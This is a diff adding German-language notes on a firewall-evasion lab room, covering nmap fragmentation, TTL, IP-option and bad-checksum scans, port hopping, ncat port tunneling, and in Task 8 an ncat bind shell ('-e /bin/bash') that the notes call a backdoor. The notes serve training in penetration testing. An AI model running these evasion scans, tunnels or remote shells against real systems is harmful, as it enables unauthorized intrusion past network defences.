@@ -224,3 +224,285 @@ Keine Antwort nötig
 ```
 
 # Task 4 - Evasion via Forcing Fragmentation, MTU, and Data Length
+Du kannst die Paketgröße steuern, was dir ermöglicht:
+
+- Pakete zu fragmentieren, optional mit einer bestimmten MTU. Wenn die Firewall oder das IDS/IPS die Pakete nicht wieder zusammensetzt, werden sie höchstwahrscheinlich passieren. Folglich wird das Zielsystem sie wieder zusammensetzen und verarbeiten.
+- Pakete mit bestimmten Datenlängen zu senden.
+
+Beantworte die folgenden Fragen
+Fragmentiere deine Pakete mit 8 Bytes Daten
+
+Eine einfache Möglichkeit, deine Pakete zu fragmentieren, besteht darin, die Option `-f` zu verwenden. Diese Option fragmentiert das IP-Paket so, dass es nur 8 Bytes Daten trägt. Wie bereits erwähnt, bedeutet das Ausführen eines Nmap-TCP-Port-Scans, dass das IP-Paket 24 Bytes enthält, den TCP-Header. Wenn du die IP-Daten auf 8 Bytes begrenzen möchtest, werden die 24 Bytes des TCP-Headers auf 3 IP-Pakete verteilt. Und genau das haben wir erhalten, als wir diesen Nmap-Scan ausgeführt haben: `nmap -sS -Pn -f -F MACHINE_IP`. Wie wir in der Wireshark-Aufzeichnung in der Abbildung unten sehen können, wird jedes IP-Paket in drei Pakete fragmentiert, jedes mit 8 Bytes Daten.  
+![2024-07-30-4b9961c8f49af3eded45b0b43c03548b.png](Bilder/2024-07-30-4b9961c8f49af3eded45b0b43c03548b.png)
+
+Was ist die Größe des IP-Pakets beim Ausführen von Nmap mit der Option -f?
+```
+
+```
+
+### Fragmentieren Sie Ihre Pakete mit 16 Bytes Daten
+
+Eine weitere nützliche Option ist `-ff`, die die IP-Daten auf 16 Bytes begrenzt. (Eine einfache Möglichkeit, sich das zu merken, ist, dass ein `f` 8 Bytes sind, aber zwei `f`s 16 Bytes.) Durch das Ausführen von `nmap -sS -Pn -ff -F MACHINE_IP` erwarten wir, dass die 24 Bytes des TCP-Headers auf zwei IP-Pakete aufgeteilt werden, 16 + 8 Bytes, da `-ff` eine Obergrenze von 16 Bytes gesetzt hat. Die ersten paar Pakete sind im Wireshark-Capture unten gezeigt.  
+![2024-07-30-fc0fd2f0fed576aed08e9750acff314b.png](Bilder/2024-07-30-fc0fd2f0fed576aed08e9750acff314b.png)
+
+Wie groß ist das maximale IP-Paket beim Ausführen von Nmap mit der Option -ff?
+```
+
+```
+
+### Fragmentieren Sie Ihre Pakete nach einem festgelegten MTU
+
+Eine weitere praktische Methode zur Fragmentierung Ihrer Pakete besteht darin, das MTU (Maximum Transmission Unit) festzulegen. In Nmap gibt `--mtu VALUE` die Anzahl der Bytes pro IP-Paket an, wobei die Größe des IP-Headers nicht berücksichtigt wird. Der Wert für das MTU muss immer ein Vielfaches von 8 sein.
+
+Beachten Sie, dass die Maximum Transmission Unit (MTU) die maximale Paketgröße angibt, die über eine bestimmte Verbindungsebene übertragen werden kann. Zum Beispiel hat Ethernet eine MTU von 1500, was bedeutet, dass das größte IP-Paket, das über eine Ethernet-Verbindung (Verbindungsebene) gesendet werden kann, 1500 Bytes beträgt. Verwechseln Sie dieses MTU nicht mit der `--mtu`-Option in Nmap.
+
+Wenn Sie Nmap mit `--mtu 8` ausführen, ist dies identisch mit `-f`, da die IP-Daten auf 8 Bytes begrenzt werden. Die ersten paar Pakete, die von diesem Nmap-Scan `nmap -sS -Pn --mtu 8 -F MACHINE_IP` erzeugt werden, sind im folgenden Wireshark-Capture zu sehen.  
+![2024-07-30-7ec48d889b3ba89910d69526ddbe4fd2.png](Bilder/2024-07-30-7ec48d889b3ba89910d69526ddbe4fd2.png)
+
+Wie groß ist das maximale IP-Paket beim Ausführen von Nmap mit der Option --mtu 36?
+```
+
+```
+
+### Pakete mit spezifischer Länge erzeugen
+
+In einigen Fällen könnte die Größe der Pakete dazu führen, dass die Firewall oder das IDS/IPS Sie erkennt und blockiert. Wenn Sie in einer solchen Situation sind, können Sie Ihre Port-Scans durch das Festlegen einer spezifischen Länge weniger auffällig machen. Sie können die Länge der Daten, die innerhalb des IP-Pakets übertragen werden, mit `--data-length VALUE` festlegen. Denken Sie daran, dass die Länge ein Vielfaches von 8 sein sollte.
+
+Wenn Sie den folgenden Nmap-Scan ausführen: `nmap -sS -Pn --data-length 64 -F MACHINE_IP`, wird jedes TCP-Segment mit zufälligen Daten aufgefüllt, bis seine Länge 64 Bytes beträgt. Im Screenshot unten sehen Sie, dass jedes TCP-Segment eine Länge von 64 Bytes hat.  
+![2024-07-30-c71dd8a63e95fac1ad5a2aa68220c780.png](Bilder/2024-07-30-c71dd8a63e95fac1ad5a2aa68220c780.png)
+
+Wie groß ist das maximale IP-Paket beim Ausführen von Nmap mit der Option `--data-length 128`?
+```
+
+```
+
+Wenn Sie den Nmap-Scan mit der Option `--data-length 128` ausführen, wird die Länge der TCP-Daten auf 128 Bytes festgelegt. Daher ist die maximale Größe des IP-Pakets die Größe der TCP-Daten plus die Header-Größen von IP und TCP. Standardmäßig ist der IP-Header 20 Bytes und der TCP-Header ebenfalls 20 Bytes groß. 
+
+Das bedeutet, dass die maximale Größe des IP-Pakets bei Verwendung von `--data-length 128` folgendermaßen berechnet wird:
+
+- IP-Header: 20 Bytes
+- TCP-Header: 20 Bytes
+- TCP-Daten: 128 Bytes
+
+**Maximale Größe des IP-Pakets = 20 Bytes (IP-Header) + 20 Bytes (TCP-Header) + 128 Bytes (TCP-Daten) = 168 Bytes**
+
+Zusammenfassung der Nmap-Optionen:
+
+| Evasion Approach                | Nmap Argument        |
+|---------------------------------|----------------------|
+| Fragmentiere IP-Daten in 8 Bytes   | `-f`                   |
+| Fragmentiere IP-Daten in 16 Bytes  | `-ff`                  |
+| Fragmentiere Pakete mit gegebenem MTU | `--mtu VALUE`         |
+| Spezifiziere Paketlänge            | `--data-length NUM`    |
+
+# Task 5 - Evasion via Modifying Header Fields
+Nmap ermöglicht es Ihnen, verschiedene Header-Felder zu steuern, die dabei helfen können, die Firewall zu umgehen. Sie können:
+
+- Die IP-Zeitüberschreitung (TTL) festlegen
+- Pakete mit angegebenen IP-Optionen senden
+- Pakete mit falschem TCP/UDP-Checksumme senden
+
+### TTL Festlegen
+
+Nmap gibt Ihnen zusätzliche Kontrolle über verschiedene Felder im IP-Header. Eines der Felder, die Sie steuern können, ist die Time-to-Live (TTL). Die Nmap-Option `--ttl VALUE` ermöglicht es Ihnen, die TTL auf einen benutzerdefinierten Wert zu setzen. Diese Option kann nützlich sein, wenn Sie denken, dass der Standard-TTL Ihre Port-Scan-Aktivitäten offenlegen könnte.
+
+Im folgenden Screenshot sehen Sie die von Wireshark erfassten Pakete nach der Verwendung einer benutzerdefinierten TTL, als wir den Scan mit dem Befehl `nmap -sS -Pn --ttl 81 -F MACHINE_IP` ausgeführt haben. Wie bei den vorherigen Beispielen wurden die Pakete auf demselben System erfasst, das auch Nmap ausführt. 
+![2024-07-30-f98efaf6faf449bf6cc2787baa581e31.png](Bilder/2024-07-30-f98efaf6faf449bf6cc2787baa581e31.png)
+
+## Fragen
+Starte die AttackBox und die mit dieser Aufgabe verbundene Maschine. Nachdem du ihnen Zeit gegeben hast, vollständig hochzufahren, scanne die angehängte MS Windows-Maschine mit der Option `--ttl 1`. Überprüfe die Anzahl der Ports, die als geöffnet angezeigt werden. Die Antwort kann je nach Verwendung der AttackBox oder der VPN-Verbindung variieren. Es wird empfohlen, beide Methoden auszuprobieren.
+```
+Keine Antwort nötig
+```
+
+Scanne die angehängte MS Windows-Maschine mit der Option `--ttl 2`. Wie viele Ports erscheinen als geöffnet?
+```
+
+```
+
+### IP-Optionen Festlegen
+
+Ein Feld im IP-Header ist das IP-Optionsfeld. Mit Nmap kannst du den Wert im IP-Optionsfeld mit der Option `--ip-options HEX_STRING` steuern, wobei der Hex-String die Bytes spezifizieren kann, die du für das IP-Optionsfeld verwenden möchtest. Jedes Byte wird als `\xHH` geschrieben, wobei HH zwei hexadezimale Ziffern repräsentiert, d. h. ein Byte.
+
+Eine Abkürzung, die Nmap bereitstellt, ist die Verwendung von Buchstaben für deine Anfragen:
+
+- **R** für Record-Route.
+- **T** für Record-Timestamp.
+- **U** für Record-Route und Record-Timestamp.
+- **L** für Loose Source Routing und muss von einer Liste von IP-Adressen gefolgt werden, die durch Leerzeichen getrennt sind.
+- **S** für Strict Source Routing und muss von einer Liste von IP-Adressen gefolgt werden, die durch Leerzeichen getrennt sind.
+
+Loose und Strict Source Routing können nützlich sein, wenn du versuchst, deine Pakete auf einem bestimmten Weg zu leiten, um ein bestimmtes Sicherheitssystem zu umgehen.
+
+### Falsche Prüfziffer Verwenden
+
+Ein weiterer Trick, den du anwenden kannst, ist das Senden von Paketen mit einer absichtlich falschen Prüfziffer. Einige Systeme verwerfen Pakete mit fehlerhaften Prüfziffern, während andere dies nicht tun. Du kannst dies zu deinem Vorteil nutzen, um mehr über die Systeme in deinem Netzwerk herauszufinden. Alles, was du tun musst, ist, die Option `--badsum` zu deinem Nmap-Befehl hinzuzufügen.
+
+Beim Scannen unseres Ziels mit `nmap -sS -Pn --badsum -F MACHINE_IP` haben wir absichtlich falsche TCP-Prüfziffern verwendet. Das Ziel hat alle unsere Pakete verworfen und auf keines von ihnen reagiert.
+```shell    
+pentester@TryHackMe# nmap -sS -Pn --badsum -F MACHINE_IP
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 16:07 EET
+Nmap scan report for MACHINE_IP
+Host is up.
+All 100 scanned ports on MACHINE_IP are filtered
+
+Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
+```
+
+Der Screenshot unten zeigt die von Wireshark auf dem System, das Nmap ausführt, erfassten Pakete. Wireshark kann optional so eingestellt werden, dass es die Prüfziffern überprüft, und wir können sehen, wie es die Fehler hervorhebt.  
+![2024-07-30-c7817144af9ef754d778fc4efb0f9a36.png](Bilder/2024-07-30-c7817144af9ef754d778fc4efb0f9a36.png)
+
+Scanne die angehängte MS Windows-Maschine mit der --badsum-Option. Wie viele Ports scheinen offen zu sein?
+```
+
+```
+
+Hier ist eine kurze Zusammenfassung der in dieser Aufgabe besprochenen Nmap-Optionen:
+Evasionsansatz  |  Nmap-Argument
+---  |  ---
+IP Time-to-Live-Feld setzen  |  --ttl WERT
+Pakete mit angegebenen IP-Optionen senden  |  --ip-options OPTIONEN
+Pakete mit falscher TCP/UDP-Prüfziffer senden  |  --badsum
+
+```
+Keine Antwort nötig
+```
+
+# Task 6 - Evasion Using Port Hopping
+Drei gängige Techniken zur Umgehung von Firewalls sind:
+
+- Port-Hopping
+- Port-Tunneling
+- Verwendung nicht standardmäßiger Ports
+
+**Port-Hopping** ist eine Technik, bei der eine Anwendung von einem Port zum anderen wechselt, bis sie eine Verbindung herstellen und aufrechterhalten kann. Mit anderen Worten, die Anwendung versucht verschiedene Ports, bis sie erfolgreich eine Verbindung herstellen kann. Einige „legitime“ Anwendungen nutzen diese Technik, um Firewalls zu umgehen. Im folgenden Bild versuchte der Client, verschiedene Ports zu erreichen, bis er einen Zielport entdeckte, der nicht von der Firewall blockiert wurde.  
+![2024-07-30-26fce8aa8569f391ad64a26a147de2d4.png](Bilder/2024-07-30-26fce8aa8569f391ad64a26a147de2d4.png)
+
+Es gibt eine weitere Art des Port-Hoppings, bei der die Anwendung eine Verbindung auf einem Port herstellt und einige Daten überträgt. Nach einer Weile wird eine neue Verbindung auf einem anderen Port hergestellt (d.h. es wird zu einem anderen Port gewechselt) und die Datenübertragung wird fortgesetzt. Der Zweck dieser Technik ist es, es dem blauen Team erschwert zu machen, den gesamten übertragenen Verkehr zu erkennen und nachzuverfolgen.
+
+Auf der AttackBox können Sie den Befehl `ncat -lvnp PORT_NUMBER` verwenden, um auf einem bestimmten TCP-Port zu lauschen.
+
+- `-l` lauscht auf eingehende Verbindungen
+- `-v` liefert detaillierte Informationen (optional)
+- `-n` löst keine Hostnamen über DNS auf (optional)
+- `-p` gibt die zu verwendende Portnummer an
+
+Beispielsweise können Sie den Befehl `ncat -lvnp 1025` auf der AttackBox ausführen, um auf TCP-Port 1025 zu lauschen, wie im folgenden Terminal-Auszug gezeigt.
+```shell
+pentester@TryHackMe$ ncat -lvnp 1025
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1025
+Ncat: Listening on 0.0.0.0:1025
+```
+
+Wir möchten testen, ob die Zielmaschine eine Verbindung zur AttackBox über TCP-Port 1025 herstellen kann. Indem Sie zu `http://MACHINE_IP:8080` navigieren, sehen Sie eine Webseite, die es Ihnen ermöglicht, Befehle auf der Zielmaschine auszuführen. Beachten Sie, dass Sie in einem echten Szenario möglicherweise einen verwundbaren Dienst ausnutzen, der Remote Code Execution (RCE) ermöglicht, oder ein falsch konfiguriertes System verwenden, um den von Ihnen gewünschten Code auszuführen.
+
+In diesem Labor können Sie einfach einen Linux-Befehl ausführen, indem Sie ihn im bereitgestellten Formular unter `http://MACHINE_IP:8080` eingeben. Wir können Netcat verwenden, um eine Verbindung zum Zielport herzustellen, indem wir den Befehl `ncat IP_ADDRESS PORT_NUMBER` ausführen. Beispielsweise können wir `ncat ATTACKBOX_IP 1024` ausführen, um eine Verbindung zur AttackBox über TCP-Port 1024 herzustellen. Wir möchten überprüfen, ob die Firewall so konfiguriert ist, dass Verbindungen erlaubt werden. Wenn die Verbindung von der Maschine mit der IP-Adresse `MACHINE_IP` die Firewall passieren kann, werden wir im Terminal der AttackBox über die erfolgreiche Verbindung benachrichtigt, wie im folgenden Beispiel gezeigt.
+```shell
+pentester@TryHackMe$ ncat -lvnp 1025
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1025
+Ncat: Listening on 0.0.0.0:1025
+Ncat: Connection from 10.10.30.130.
+Ncat: Connection from 10.10.30.130:51292.
+```
+
+## Fragen:
+Verwenden Sie diese einfache Technik, um herauszufinden, welcher der folgenden Ziel-TCP-Ports von dem geschützten System aus erreichbar ist:
+
+- 21
+- 23
+- 25
+- 26
+- 27
+
+```
+
+```
+
+# Task 7 - Evasion Using Port Tunneling
+### Port Tunneling
+
+Port Tunneling, auch bekannt als Portweiterleitung oder Port-Mapping, ist eine Technik, bei der Pakete, die an einen Zielport gesendet werden, an einen anderen Zielport weitergeleitet werden. Einfach gesagt, werden Pakete, die an Port 80 eines Systems gesendet werden, an Port 8080 eines anderen Systems weitergeleitet.
+
+### Port Tunneling mit `ncat`
+
+Stellen Sie sich vor, Sie haben einen Server hinter einer Firewall, auf den Sie von außen nicht zugreifen können. Allerdings haben Sie festgestellt, dass die Firewall bestimmte Ports nicht blockiert. Sie können dieses Wissen nutzen, indem Sie den Datenverkehr über einen anderen Port tunneln.
+
+Angenommen, wir haben einen SMTP-Server, der auf Port 25 hört, aber wir können keine Verbindung zum SMTP-Server herstellen, da die Firewall Pakete an Port 25 blockiert. Wir stellen fest, dass Pakete an Port 443 nicht blockiert werden, also entscheiden wir uns, diese Gelegenheit zu nutzen und unsere Pakete an Port 443 zu senden. Nachdem die Pakete die Firewall passiert haben, leiten wir sie an Port 25 weiter. Angenommen, wir können auf einem der Systeme hinter der Firewall Befehle ausführen. Wir können dieses System verwenden, um unsere Pakete zum SMTP-Server weiterzuleiten, indem wir folgenden Befehl verwenden:
+
+```
+ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
+```
+
+Der Befehl `ncat` verwendet folgende Optionen:
+
+- `-lvnp 443`: Hört auf TCP-Port 443. Da die Portnummer kleiner als 1024 ist, müssen Sie `ncat` in diesem Fall als Root ausführen.
+- `-c` oder `--sh-exec`: Führt den angegebenen Befehl über `/bin/sh` aus.
+- `"ncat TARGET_SERVER 25"`: Stellt eine Verbindung zum Zielserver an Port 25 her.
+
+Das Ergebnis ist, dass `ncat` auf Port 443 hört, aber alle Pakete an Port 25 auf dem Zielserver weiterleitet. Da die Firewall in diesem Fall Port 25 blockiert und Port 443 zulässt, ist Port-Tunneling eine effiziente Methode, um die Firewall zu umgehen.  
+![2024-07-30-ef6b903dbb6c4eb20051f9ddd5b9fa8f.png](Bilder/2024-07-30-ef6b903dbb6c4eb20051f9ddd5b9fa8f.png)
+
+Wir haben einen Webserver, der auf den HTTP-Port 80 hört. Die Firewall blockiert den Verkehr zu Port 80 aus dem nicht vertrauenswürdigen Netzwerk; wir haben jedoch festgestellt, dass der Verkehr zu TCP-Port 8008 nicht blockiert wird. Wir verwenden weiterhin das Web-Formular aus Aufgabe 6, um den ncat-Listener einzurichten, der die empfangenen Pakete an den weitergeleiteten Port weiterleitet. Rufen Sie mit Port-Tunneling den Webserver auf und rufen die Flag ab.  
+```
+
+```
+
+# Task 8 - Evasion Using Non-Standard Ports
+`ncat -lvnp PORT_NUMBER -e /bin/bash` erstellt eine Hintertür über die angegebene Portnummer, die es Ihnen ermöglicht, mit der Bash-Shell zu interagieren.
+
+- `-e` oder `--exec` führt den angegebenen Befehl aus
+- `/bin/bash` ist der Ort des Befehls, den wir ausführen möchten
+
+Auf dem AttackBox können wir `ncat MACHINE_IP PORT_NUMBER` ausführen, um eine Verbindung zum Zielrechner herzustellen und mit dessen Shell zu interagieren.
+
+Angenommen, wir haben eine Firewall, reicht es nicht aus, `ncat` zu verwenden, um eine Hintertür zu erstellen, es sei denn, wir können eine Verbindung zur hörenden Portnummer herstellen. Außerdem können wir, es sei denn, wir führen ncat als privilegierter Benutzer, `root` oder mit `sudo` aus, keine Portnummern unter 1024 verwenden.
+
+## Fragen:
+Wir verwenden weiterhin das Webformular aus Aufgabe 6, um den ncat-Listener einzurichten. Da die Firewall keine Pakete zu Zielport 8081 blockiert, verwenden Sie `ncat`, um auf eingehende Verbindungen zu hören und die Bash-Shell auszuführen. Verwenden Sie den AttackBox, um eine Verbindung zur hörenden Shell herzustellen. Wie lautet der Benutzername, mit dem Sie angemeldet sind?
+```
+
+```
+
+# Task 9 - Next-Generation Firewalls
+Traditionelle Firewalls, wie paketfilternde Firewalls, erwarten, dass eine Portnummer das verwendete Protokoll bestimmt und die Anwendung identifiziert. Wenn Sie daher eine Anwendung blockieren möchten, müssen Sie einen Port blockieren. Leider ist dies nicht mehr gültig, da viele Anwendungen sich über Ports tarnen, die für andere Anwendungen zugewiesen sind. Mit anderen Worten, eine Portnummer reicht nicht mehr aus, um die verwendete Anwendung zuverlässig zu identifizieren. Dazu kommt die weitverbreitete Nutzung von Verschlüsselung, z.B. via SSL/TLS.
+
+Next-Generation Firewalls (NGFW) sind so konzipiert, dass sie die neuen Herausforderungen moderner Unternehmen bewältigen können. Einige der Fähigkeiten von NGFW umfassen:
+
+- Integration einer Firewall und eines Echtzeit-Eindringungsschutzsystems (IPS). Es kann jede erkannte Bedrohung in Echtzeit stoppen.
+- Identifikation von Benutzern und ihrem Datenverkehr. Es kann die Sicherheitsrichtlinie pro Benutzer oder pro Gruppe durchsetzen.
+- Identifikation von Anwendungen und Protokollen unabhängig von der verwendeten Portnummer.
+- Identifikation der übertragenen Inhalte. Es kann die Sicherheitsrichtlinie durchsetzen, wenn Verstöße gegen Inhalte festgestellt werden.
+- Fähigkeit zur Entschlüsselung von SSL/TLS- und SSH-Verkehr. Zum Beispiel schränkt es ausweichende Techniken ein, die auf Verschlüsselung basieren, um bösartige Dateien zu übertragen.
+
+Eine ordnungsgemäß konfigurierte und eingesetzte NGFW macht viele Angriffe nutzlos.
+
+## Fragen:
+Was ist die Nummer der höchsten OSI-Schicht, die eine NGFW verarbeiten kann?
+```
+
+```
+
+# Task 10 - Conclusion
+Dieser Raum behandelte die verschiedenen Arten von Firewalls und die gängigen Umgehungstechniken. Das korrekte Verständnis der Einschränkungen der Ziel-Firewall-Technologie hilft Ihnen dabei, geeignete Firewall-Umgehungsverfahren auszuwählen und zu konstruieren. Dieser Raum demonstrierte verschiedene Umgehungstechniken mit ncat; jedoch können die gleichen Ergebnisse auch mit einem anderen Werkzeug wie socat erzielt werden. Es wird empfohlen, sich den Raum "What the Shell?" anzusehen.
+
+Die folgende Tabelle fasst die in diesem Raum behandelten Nmap-Argumente zusammen.
+
+| Umgehungsansatz | Nmap-Argument |
+|-----------------|----------------|
+| Einen Scan mit Decoys verstecken | -D DECOY1_IP1,DECOY_IP2,ME |
+| Verbindungen über einen HTTP/SOCKS4-Proxy weiterleiten | --proxies PROXY_URL |
+| Quell-MAC-Adresse fälschen | --spoof-mac MAC_ADDRESS |
+| Quell-IP-Adresse fälschen | -S IP_ADDRESS |
+| Eine bestimmte Quellportnummer verwenden | -g PORT_NUM oder --source-port PORT_NUM |
+| IP-Daten in 8 Bytes fragmentieren | -f |
+| IP-Daten in 16 Bytes fragmentieren | -ff |
+| Pakete mit gegebener MTU fragmentieren | --mtu VALUE |
+| Paketlänge festlegen | --data-length NUM |
+| IP-Zeit-zu-leben-Feld (TTL) festlegen | --ttl VALUE |
+| Pakete mit spezifischen IP-Optionen senden | --ip-options OPTIONS |
+| Pakete mit falscher TCP/UDP-Prüfsumme senden | --badsum |
+
+Diese Tabelle bietet eine schnelle Übersicht der Nmap-Argumente und ihrer Umgehungsansätze, die in diesem Raum behandelt wurden.
